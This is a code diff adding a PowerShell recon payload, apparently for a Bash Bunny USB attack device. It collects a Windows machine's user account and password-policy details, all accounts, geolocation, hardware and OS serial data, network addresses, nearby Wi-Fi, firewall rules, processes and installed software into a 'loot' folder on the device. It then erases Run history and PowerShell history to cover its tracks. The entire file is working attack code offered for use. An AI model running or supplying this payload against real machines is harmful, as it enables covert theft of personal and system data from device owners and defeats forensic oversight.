@@ -1,0 +1,275 @@
+<#
+       444444444       000000000            444444444       
+      4::::::::4     00:::::::::00         4::::::::4       
+     4:::::::::4   00:::::::::::::00      4:::::::::4       
+    4::::44::::4  0:::::::000:::::::0    4::::44::::4       
+   4::::4 4::::4  0::::::0   0::::::0   4::::4 4::::4       
+  4::::4  4::::4  0:::::0     0:::::0  4::::4  4::::4       
+ 4::::4   4::::4  0:::::0     0:::::0 4::::4   4::::4       
+4::::444444::::4440:::::0 000 0:::::04::::444444::::444     
+4::::::::::::::::40:::::0 000 0:::::04::::::::::::::::4     
+4444444444:::::4440:::::0     0:::::04444444444:::::444     
+          4::::4  0:::::0     0:::::0          4::::4       
+          4::::4  0::::::0   0::::::0          4::::4       
+          4::::4  0:::::::000:::::::0          4::::4       
+        44::::::44 00:::::::::::::00         44::::::44     
+        4::::::::4   00:::::::::00           4::::::::4     
+        4444444444     000000000             4444444444
+
+Author: VVillz
+Attack Type: Recon
+System: Windows 10/11
+Description: This program is a recon program for scanning a pc for various information
+
+What will be retrieved: (Not in order)
+* Computer name
+* Bios
+* Primary Owner Name
+* User Full Name
+* User Accout Expiration (If there is any)
+* User Desccription (If there is any)
+* Password Expiration (If there is any)
+* If User May Change Password
+* If Password is Required
+* When Password was Last Set
+* Username
+* Last Logon (If available)
+* SID
+* Principal Source
+* User Object Class
+* Geolocation (Latitude, Longitude)
+* Computer Domain
+* Total Physical Memory
+* Computer Model
+* Motherboard Information
+* Processor Information
+* Video Card Information
+* Ram Information
+* OS Name
+* OS Version
+* OS 32-bit or 64-bit
+* OS Build Number
+* Logged IP Addresses
+* Logged MacAddresses
+* Near By Wi-Fi (As well as the wi-fi information)
+* Makes a Directory for Firewall Permissions (Rules)
+* All Accounts on System
+* Makes a Directory for Running Programms
+* Covers Your Tracks
+ - Clears Powershell History
+ - Clears Windows Run History
+* Serial Number
+* Makes a New Directory for Installed Software
+#>
+
+$tag = "
+
+----------------------------------------------------------------------------------------------------
+  ____ ___  ____   
+ / / // _ \/ / /   
+/_  _/ // /_  _/   
+ /_/ \___/ /_/     
+
+----------------------------------------------------------------------------------------------------
+                   
+"
+
+$hello = "
+                                                                                               
+----------------------------------------------------------------------------------------------------
+                                                                                               
+RRRRRRRRRRRRRRRRR                                                                              
+R::::::::::::::::R                                                                             
+R::::::RRRRRR:::::R                                                                            
+RR:::::R     R:::::R                                                                           
+  R::::R     R:::::R    eeeeeeeeeeee        cccccccccccccccc   ooooooooooo   nnnn  nnnnnnnn    
+  R::::R     R:::::R  ee::::::::::::ee    cc:::::::::::::::c oo:::::::::::oo n:::nn::::::::nn  
+  R::::RRRRRR:::::R  e::::::eeeee:::::ee c:::::::::::::::::co:::::::::::::::on::::::::::::::nn 
+  R:::::::::::::RR  e::::::e     e:::::ec:::::::cccccc:::::co:::::ooooo:::::onn:::::::::::::::n
+  R::::RRRRRR:::::R e:::::::eeeee::::::ec::::::c     ccccccco::::o     o::::o  n:::::nnnn:::::n
+  R::::R     R:::::Re:::::::::::::::::e c:::::c             o::::o     o::::o  n::::n    n::::n
+  R::::R     R:::::Re::::::eeeeeeeeeee  c:::::c             o::::o     o::::o  n::::n    n::::n
+  R::::R     R:::::Re:::::::e           c::::::c     ccccccco::::o     o::::o  n::::n    n::::n
+RR:::::R     R:::::Re::::::::e          c:::::::cccccc:::::co:::::ooooo:::::o  n::::n    n::::n
+R::::::R     R:::::R e::::::::eeeeeeee   c:::::::::::::::::co:::::::::::::::o  n::::n    n::::n
+R::::::R     R:::::R  ee:::::::::::::e    cc:::::::::::::::c oo:::::::::::oo   n::::n    n::::n
+RRRRRRRR     RRRRRRR    eeeeeeeeeeeeee      cccccccccccccccc   ooooooooooo     nnnnnn    nnnnnn
+                                                                                               
+----------------------------------------------------------------------------------------------------                                                                                             
+                                                                                                                                                                                                                                                                                              
+"
+
+$bb = (gwmi win32_volume -f 'label=''BashBunny''').Name
+
+# Test if directory exists if not create directory in loot folder to store file
+$TARGETNAME = "$bb\loot\Recon\$env:computername"
+
+if(!(Test-Path -Path $TARGETNAME )){
+    mkdir $TARGETNAME
+    New-Item $bb\loot\Recon\$env:computername\1.MainResult.txt
+    New-Item $bb\loot\Recon\$env:computername\4.FirewallAppRules.txt
+    New-Item $bb\loot\Recon\$env:computername\2.RunningProcesses.txt
+    New-Item $bb\loot\Recon\$env:computername\3.InstalledSoftware.txt
+}
+
+($hello | Out-String) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET COMPUTER NAME
+$computername = $env:COMPUTERNAME
+
+# MAKE PRESENTATION FANCY
+"Computer Name:"+" "+($computername | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET USERNAME
+$username = $env:USERNAME
+
+# MAKE PRESENTATION FANCY
+"Logged in Username:"+" "+($username | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+"About Logged in User ("+($username)+"):
+===================================================================================================="+ (Get-LocalUser -Name $username | select * | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET USER ACCOUNT LIST
+$userAccounts = Get-WmiObject -Class Win32_UserAccount
+
+"All Accounts:
+===================================================================================================="+ ($userAccounts | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# This program gets the geolocation of the computer this program is run on and major credit to I-Am-Jakoby
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+$GL = Get-GeoLocation
+"Geolocation:
+===================================================================================================="+ ($GL | Format-List -Property "Latitude", "Longitude" | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET BIOS AND MAKE IT LOOK FANCY
+"Bios:
+===================================================================================================="+ (Get-CimInstance CIM_BIOSElement | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET GENERAL COMPUTER INFORMATION AND MAKE IT LOOK FANCY
+"General Computer Information:
+===================================================================================================="+ (Get-CimInstance CIM_ComputerSystem | Format-List -Property "Name", "PrimaryOwnerName", "Domain", "TotalPhysicalMemory", "Model" | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET MOTHERBOARD INFORMATION AND MAKE IT LOOK FANCY
+"Motherboard Information:
+===================================================================================================="+ (Get-WmiObject Win32_BaseBoard | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# PROCESSOR INFORMATION AND MAKE IT LOOK FANCY
+"Processor Information:
+===================================================================================================="+ (Get-WmiObject win32_processor | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# VIDEO CARD INFORMATION AND MAKE IT LOOK FANCY
+"Video Card Information:
+===================================================================================================="+ (Get-WmiObject Win32_VideoController | Format-List -Property "Name", "DriverVersion", "DriverDate", "MaxRefreshRate", "MinRefreshRate", "VideoModeDescription" | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# RAM INFORMATION AND MAKE IT LOOK FANCY
+"Ram Information:
+===================================================================================================="+ (Get-WmiObject Win32_PhysicalMemory | Format-List BankLabel, Capacity, Speed, Manufacturer, PartNumber | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET THE OS NAME AND MAKE IT LOOK FANCY
+"OS Name:
+===================================================================================================="+ ((Get-WmiObject win32_operatingsystem) | Select Name | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET OS VERSION AND MAKE IT LOOK FANCY
+"OS Version:
+===================================================================================================="+ ((Get-WmiObject win32_operatingsystem) | Select Version | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# IS THE OS 32-BIT OR 64-BIT? ALSO MAKE IT LOOK FANCY
+"OS 32-bit or 64-bit:
+===================================================================================================="+ ((Get-WmiObject win32_operatingsystem) | Select OSArchitecture | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET THE OS BUILD NUMBER AND MAKE IT LOOK FANCY
+"OS Build Number:
+===================================================================================================="+ ((Get-WmiObject win32_operatingsystem) | Select BuildNumber | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET THE SERIAL NUMBER AND MAKE IT LOOK FANCY
+"Serial Number:
+===================================================================================================="+ ((Get-WmiObject win32_operatingsystem) | Select SerialNumber | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET LOGGED IP ADDRESSES AND MAKE IT LOOK FANCY
+"Logged IP Addresses:
+===================================================================================================="+ (Get-NetIPAddress | ?{ $_.AddressFamily -eq "IPv4"  -and !($_.IPAddress -match "169") -and !($_.IPaddress -match "127") } | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET LOGGED MACADDRESSES AND MAKE IT LOOK FANCY
+"Logged MacAddresses:
+===================================================================================================="+ (get-netadapter | Format-List -Property "Name", "InterfaceDescription", "MacAddress" | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# GET THE FIREWALL PERMISSIONS AND MAKE IT LOOK FANCY
+
+$firewallRules = Get-NetFirewallRule
+
+"Firewall Rules:
+===================================================================================================="+ ($firewallRules | out-string) >> $bb\loot\Recon\$env:computername\4.FirewallAppRules.txt
+
+# GET THE RUNNING PROCESSES AND MAKE IT LOOK FANCY
+
+$processes = Get-Process
+
+"Running Processes:
+===================================================================================================="+ ($processes | out-string) >> $bb\loot\Recon\$env:computername\2.RunningProcesses.txt
+
+# GET NEAR BY WI-FI
+try
+{
+$NearbyWifi = netsh wlan show networks mode=bssid
+}
+catch
+{
+$NearbyWifi="No nearby wifi networks detected"
+}
+
+# MAKE PRESENTATION FANCY
+"Near By Wi-Fi:
+============================================================"+
+($NearbyWifi | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# SHOW INTERFACES ON SYSTEM AND MAKE PRESENTATION FANCY
+"Interfaces on System:
+============================================================"+
+(netsh wlan show interfaces | out-string) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+$installedSoftware = Get-WmiObject -Class Win32_Product
+
+# GET INSTALLED SOFTWARE AND MAKE PRESENTATION FANCY
+foreach ($software in $installedSoftware)
+{
+"Installed Software:
+============================================================"+
+($software | out-string) >> $bb\loot\Recon\$env:computername\3.InstalledSoftware.txt
+}
+
+($tag | out-String) >> $bb\loot\Recon\$env:computername\1.MainResult.txt
+
+# CLEAR YOUR TRACKS
+
+# CLEAR WINDOWS RUN HISTORY
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# CLEAR POWERSHELL HISTORY
+# Clear the PowerShell history
+Clear-History
+
+# Delete the PowerShell command history file
+Remove-Item -Path "$env:USERPROFILE\Documents\WindowsPowerShell\History\*.hist" -ErrorAction SilentlyContinue
